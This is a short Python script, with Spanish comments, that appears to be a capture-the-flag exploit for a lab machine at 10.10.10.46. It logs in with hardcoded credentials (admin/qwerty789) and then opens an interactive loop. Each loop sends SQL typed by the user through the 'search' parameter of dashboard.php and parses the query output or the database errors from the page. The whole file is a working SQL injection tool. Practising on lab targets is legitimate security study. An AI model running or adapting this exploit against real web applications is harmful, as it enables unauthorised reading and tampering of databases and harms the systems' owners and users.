#!/usr/bin/python3
# coding: utf-8

# Author: Gaizka Martin (a.k.a g2jz)

import requests
import re
import signal
import urllib
import sys
import time

from pwn import *


# Variables globales
login_url = "http://10.10.10.46/index.php"
sqli_url = "http://10.10.10.46/dashboard.php"


# Sesion HTTP
s = requests.Session()


# Ctrl + C
def handler(sig,frame):
	
	print("")
	log.failure("Saliendo...")
	sys.exit(1)


signal.signal(signal.SIGINT,handler)


# Login
def login():

	log.info("Accediendo al recurso vulnerable a SQLi")
	time.sleep(1)
	print("")

	login_data = {
		'username' : 'admin',
		'password' : 'qwerty789'
	}

	r = s.post(login_url, data=login_data)


# SQLi
def makeRequest(cmd):
	
	query = "?search=b' " + urllib.parse.quote(cmd + "--", encoding="utf-8", errors=None)
	payload = sqli_url + query

	r = s.get(payload)
	
	if "LINE" in r.text:
		error = re.findall(r'LINE 1: (.*)',r.text)[0]

		print("")
		log.failure("Error:" + error)
		print("")
	elif "lalign" in r.text:
		print("")
		success = re.findall(r'<td class=\'lalign\'>(.*?)</td>', r.text)
		for out in success:
			log.info(out)
		print("")
	else:
		print("")
		log.info("El comando introducido no ha producido error")
		print("")


# Main
if __name__ == "__main__":
	
	try:
		login()
	except:
		log.failure("Se ha producido un error al iniciar sesión")
		sys.exit(1)

	while True:
	
		print("[+] Comando (?search=b' ): ", end="")
		cmd = input().strip()
		
		try:
			makeRequest(cmd)
		except:
			log.failure("Se ha producido un error en la inyección SQL")
